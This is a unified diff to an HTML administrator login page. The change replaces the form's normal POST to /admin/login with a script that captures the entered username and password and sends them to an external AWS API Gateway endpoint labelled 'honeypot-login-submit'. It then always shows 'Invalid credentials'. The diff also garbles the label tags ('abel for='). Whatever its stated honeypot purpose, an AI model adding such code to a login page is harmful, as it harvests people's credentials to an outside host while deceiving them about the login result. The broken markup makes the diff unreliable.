@@ -73,15 +73,37 @@
     <h1>Administrator Login</h1>
     <p class="helper">Sign in to continue.</p>
 
-    <form action="/admin/login" method="post">
-      <label for="username">Username</label>
-      <input id="username" name="username" type="text" autocomplete="username" />
+    <form id="login-form">
+  abel for="username">Username</label>
+  <input id="username" name="username" type="text" autocomplete="username" />
 
-      <label for="password">Password</label>
-      <input id="password" name="password" type="password" autocomplete="current-password" />
+  abel for="password">Password</label>
+  <input id="password" name="password" type="password" autocomplete="current-password" />
 
-      <button type="submit">Sign In</button>
-    </form>
+  <button type="submit">Sign In</button>
+</form>
+
+<script>
+  document.getElementById('login-form').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const btn = document.querySelector('button');
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    try {
+      await fetch('https://wp05dksre9.execute-api.us-east-1.amazonaws.com/prod/honeypot-login-submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+      });
+    } catch (err) {
+      console.error(err);
+    }
+
+    btn.textContent = 'Invalid credentials';
+    btn.disabled = true;
+  });
+</script>
 
     <div class="footer-note">
       By continuing, you agree to the <a href="/terms">Terms of Use</a>. Authorized use only.
